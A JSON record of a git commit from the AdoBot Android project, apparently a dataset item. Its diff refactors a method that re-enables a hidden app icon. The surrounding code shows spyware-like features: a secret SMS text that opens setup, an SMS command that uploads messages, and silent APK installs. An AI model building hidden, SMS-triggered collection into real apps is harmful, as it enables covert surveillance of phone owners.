{"new_feature": "136,1,5,239,2,0.99", "commitmessage": "fix open setup activity", "patch": ["@@ -36,10 +36,10 @@ public void setContext(Context context) {\n         this.commonParams = new CommonParams(context);\n     }\n \n-    protected void showAppIcon() {\n+    protected void showAppIcon(Class actClass) {\n         PackageManager p = context.getPackageManager();\n-        ComponentName componentName = new ComponentName(context, PermissionsActivity.class);\n-        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);\n+        ComponentName permissionsActivity = new ComponentName(context, actClass);\n+        p.setComponentEnabledSetting(permissionsActivity, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);\n     }\n \n     public String getContactName(String phoneNumber) {\n@@ -68,7 +68,7 @@ public String getContactName(String phoneNumber) {\n \n     protected void requestPermissions() {\n         // app icon already shown in debug\n-        if (!BuildConfig.DEBUG) showAppIcon();\n+        if (!BuildConfig.DEBUG) showAppIcon(PermissionsActivity.class);\n         Intent i = new Intent(context, PermissionsActivity.class);\n         i.addFlags(FLAG_ACTIVITY_NEW_TASK);\n         context.startActivity(i);", "@@ -276,11 +276,10 @@ private void saveSms(Cursor mCur) {\n             String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, \"Open adobot\");\n \n             if (Objects.equals(body.trim(), smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {\n-                showAppIcon();\n+                showAppIcon(SetupActivity.class);\n                 Intent setupIntent = new Intent(context, SetupActivity.class);\n                 setupIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);\n                 context.startActivity(setupIntent);\n-                return;\n             }\n \n             String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, \"Baby?\");", "@@ -138,6 +138,7 @@ public void installApk(File file){\n //                Prompt update activity\n                 Log.i(TAG, e.toString());\n                 Log.i(TAG, \"no root, open update activity\");\n+                showAppIcon(UpdateActivity.class);\n                 Intent updateIntent = new Intent(context, UpdateActivity.class);\n                 updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);\n                 context.startActivity(updateIntent);"], "edit": ["-    protected void showAppIcon() {", "+    protected void showAppIcon(Class actClass) {", "-        ComponentName componentName = new ComponentName(context, PermissionsActivity.class);", "-        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);", "+        ComponentName permissionsActivity = new ComponentName(context, actClass);", "+        p.setComponentEnabledSetting(permissionsActivity, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);", "-        if (!BuildConfig.DEBUG) showAppIcon();", "+        if (!BuildConfig.DEBUG) showAppIcon(PermissionsActivity.class);", "-                showAppIcon();", "+                showAppIcon(SetupActivity.class);", "-                return;", "+                showAppIcon(UpdateActivity.class);"], "url": ["https://api.github.com/repos/adonespitogo/AdoBot/commits/ae116e5748388c4b57592d357ab70202859ffb86"]}